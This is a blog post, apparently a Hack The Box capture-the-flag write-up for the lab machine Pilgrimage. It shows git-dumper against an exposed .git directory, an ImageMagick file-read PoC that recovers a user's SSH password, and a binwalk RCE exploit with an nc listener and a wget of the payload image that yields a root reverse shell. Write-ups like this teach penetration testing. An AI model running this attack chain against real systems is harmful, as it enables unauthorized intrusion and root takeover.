@@ -1,0 +1,302 @@
+<!DOCTYPE html>
+<html class="" lang="en-us"><head>
+    
+    <meta name="viewport" content="width=device-width" />
+    <meta http-equiv="Content-Type" content="text/html;charset=UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=7" />
+
+    <link
+    rel="icon"
+    href='/favicon.png'
+/>
+<link
+    rel="shortcut icon"
+    href='/favicon.ico'
+    type="image/x-icon"
+/>
+<link
+    rel="apple-touch-icon"
+    href='/apple-touch-icon.png'
+/>
+
+    <link
+        rel="icon"
+        href='/logo.svg'
+        type="image/svg+xml"
+    />
+
+<title>
+        
+            Hackthebox Writeup Pilgrimage  &ndash;
+        
+        Blogs
+    </title>
+    <link href="/symbols-nerd-font/symbols-nerd-font.css" rel="stylesheet" />
+    <link href="/jetbrains-mono/jetbrains-mono.css" rel="stylesheet" />
+    
+    
+    <link type="text/css" rel="stylesheet" href=https://bott0n.github.io/css/styles.6f84514ad632600fba315252a38e35f30218f3d5ec268c1236f62782176917002e704c2b142a2d949bd831c6feabc3d6db35a3c6d6e151b839b9fe80cc19fa4f.css integrity="sha512-b4RRStYyYA&#43;6MVJSo4418wIY89XsJowSNvYnghdpFwAucEwrFCotlJvYMcb&#43;q8PW2zWjxtbhUbg5uf6AzBn6Tw==" />
+<meta name="author" content="button" />
+
+    
+        <meta name="keywords" content='hackthebox' />
+    
+    
+        <meta name="description" content="" />
+    
+
+<meta property="og:site_name"
+    content='Blogs' />
+
+    <meta property="og:title" content="Hackthebox Writeup Pilgrimage" />
+    <meta property="og:type" content="article" />
+    
+    <meta
+        property="article:author" content="button" />
+    <meta
+        property="article:published_time"
+        content='2023-07-08T16:04:50Z&#43;0800' />
+    
+        
+            <meta property="article:tag" content="hackthebox" />
+        
+    
+    <meta property="og:url" content="https://bott0n.github.io/posts/hackthebox-writeup-pilgrimage/" />
+    <meta property="og:image"
+        content='https://bott0n.github.io/icon512.png
+    ' />
+    
+        <meta property="og:description" content="" />
+    
+
+<meta name="twitter:card" content="summary_large_image" />
+<meta property="twitter:domain"
+      content='bott0n.github.io'
+/>
+<meta property="twitter:url" content="https://bott0n.github.io/posts/hackthebox-writeup-pilgrimage/" />
+
+
+    <meta name="twitter:title" content="Hackthebox Writeup Pilgrimage" />
+    
+    <meta name="twitter:image"
+        content='https://bott0n.github.io/icon512.png
+    ' />
+    
+        <meta name="twitter:description" content="" />
+    
+
+<link rel="manifest" href="/manifest/index.json" />
+</head>
+
+
+<body>
+        <div id="baseContainer"><header class="">
+<div class="titleAndSearchContainer">
+        <div id="titleContainer">
+            
+                <a class="unstyledLink" href="/">
+                    <img src='/logo.svg' />
+                </a>
+            
+            <div class="rightOfLogo">
+                <div class="titleAndHamburger">
+                    <h1>
+                        <a class="unstyledLink" href="/">Blogs</a>
+                        
+                    </h1>
+                    
+                </div>
+                <div id="wide_nav"><nav>
+    
+    <ul id="main-nav">
+        <li><a href="/">Home</a></li>
+        
+            <li><a href="/posts">Posts</a></li>
+        
+        
+        
+        
+        
+        
+            <li><a href="/about/">About</a></li>
+        
+        
+            <li><a href="/tags">Tags</a></li>
+        
+        
+    </ul>
+</nav>
+</div>
+            </div>
+        </div>
+        <div class="search">
+    <input id="searchbar" type="text" placeholder='Search' />
+    <a class="nerdlink" onclick="newSearch();">&#xf002;</a>
+</div>
+<script>
+    function newSearch() {
+        let term = searchbar.value.trim();
+        if (!term) return;
+        location.href = `/search?q=${term}`;
+    }
+    searchbar.onkeyup = (ev) => {if (ev.keyCode == 13) newSearch()};
+</script>
+
+    </div>
+    <div id="links">
+        <a
+    
+        rel="noreferrer"
+    
+    target="_blank"
+    class="nerdlink"
+    href="/index.xml">
+    
+    
+        &#xf09e;
+    
+    <span>
+        RSS
+    </span>
+</a>
+
+        
+        <a
+    
+        rel="noreferrer"
+    
+    target="_blank"
+    class="nerdlink"
+    href="https://github.com/bott0m">
+    
+    
+        &#xf09b;
+    
+    <span>
+        GitHab
+    </span>
+</a>
+<a
+    
+        rel="noreferrer"
+    
+    target="_blank"
+    class="nerdlink"
+    href="https://twitter.com/bottom3310">
+    
+    
+        &#xf099;
+    
+    <span>
+        Titter
+    </span>
+</a>
+
+    </div>
+    
+
+</header>
+<div id="contentContainer">
+                <div id="content">
+                    <main>
+<article class="card single">
+    
+        <h1>Hackthebox Writeup Pilgrimage</h1>
+    
+    
+        <p class="date">
+            <span title='Date'> </span>
+    2023-07-08
+
+</p>
+    
+    
+    
+    <div class="articleToc">
+    <nav id="TableOfContents"></nav>
+    <hr />
+</div>
+
+    <div><h1 id="user-shell">User Shell</h1>
+<p>We found .git directory from nmap</p>
+<p><img src="https://i.imgur.com/zDIJgzy.png" alt=""></p>
+<p>We can use git-dumper to dump the git repo</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">./git_dumper.py http://pilgrimage.htb/.git dump
+</code></pre></div><p>We found a binary file magick, google it we found a poc
+<a href="https://github.com/duc-nt/CVE-2022-44268-ImageMagick-Arbitrary-File-Read-PoC">https://github.com/duc-nt/CVE-2022-44268-ImageMagick-Arbitrary-File-Read-PoC</a></p>
+<pre tabindex="0"><code>total 26972
+drwxr-xr-x 5 kali kali     4096 Jul  8 02:30 .
+drwxr-xr-x 4 kali kali     4096 Jul  8 04:44 ..
+drwxr-xr-x 6 kali kali     4096 Jul  8 02:30 assets
+-rwxr-xr-x 1 kali kali     5538 Jul  8 02:30 dashboard.php
+drwxr-xr-x 7 kali kali     4096 Jul  8 02:30 .git
+-rwxr-xr-x 1 kali kali     9250 Jul  8 02:30 index.php
+-rwxr-xr-x 1 kali kali     6822 Jul  8 02:30 login.php
+-rwxr-xr-x 1 kali kali       98 Jul  8 02:30 logout.php
+-rwxr-xr-x 1 kali kali 27555008 Jul  8 02:30 magick
+-rwxr-xr-x 1 kali kali     6836 Jul  8 02:30 register.php
+drwxr-xr-x 4 kali kali     4096 Jul  8 02:30 vendor
+
+</code></pre><p>We now can read any file we want, from the source code, we found &ldquo;sqlite:/var/db/pilgrimage&rdquo;</p>
+<p><img src="https://i.imgur.com/k15YNzy.png" alt="Imgur">
+Read that file, we can find the password of emily</p>
+<p><code>emily : abigchonkyboi123</code></p>
+<p>Then we are able to ssh with emaily</p>
+<h1 id="root">Root</h1>
+<p>From linpeas reuslt, we can find a file “/usr/sbin/malwarescan.sh” executed by root
+<img src="https://i.imgur.com/4dsfHLx.png" alt="Imgur"></p>
+<p><img src="https://i.imgur.com/sppCU1a.png" alt="Imgur"></p>
+<p>By reading the content, the script means:</p>
+<ol>
+<li>notice new created any file in &ldquo;/var/www/pilgrimage.htb/shrunk/&rdquo;</li>
+<li>binwalk the new files</li>
+<li>If the file containsed blacklist, it will remove it</li>
+</ol>
+<p>the binwalk location is intersting, we dry run it once</p>
+<p><img src="https://i.imgur.com/Wb4uAYx.png" alt="Imgur"></p>
+<p>We could knew it is v2.3.2, google it, we will find it has a RCE vulnerability.</p>
+<p>As a result, we use the poc to gain the root reverse shell
+<a href="https://www.exploit-db.com/exploits/51249">https://www.exploit-db.com/exploits/51249</a></p>
+<pre tabindex="0"><code># In host:
+python3 lpe.py shit.png 10.10.14.35 443
+
+nc -lvnp 443
+
+# In victim:
+wget 10.10.14.35/binwalk_exploit.png
+</code></pre></div>
+</article>
+
+    <hr />
+    <p class="articleTagsContainer">
+        <span> </span>
+        <strong>Tags:</strong>
+        
+            <a
+                
+                href="/tags/hackthebox">#hackthebox</a>
+        
+    </p>
+
+
+
+
+
+
+                    </main><footer>
+    <hr />
+
+<p><small>
+        2023 &copy; Some copyright notice - <a href="https://example.com/license">my license</a>
+    </small></p>
+    <p><small>
+        <a href='https://gitlab.com/gabmus/hugo-ficurinia'>Ficurinia theme</a> for <a href='https://gohugo.io'>Hugo</a> by <a href='https://gabmus.org'>Gabriele Musco</a>. Licensed under <a href='https://www.gnu.org/licenses/agpl-3.0.html'>GNU AGPLv3</a>.
+    </small></p>
+</footer>
+</div>
+            </div>
+        </div>
+
+
+</body>
+</html>
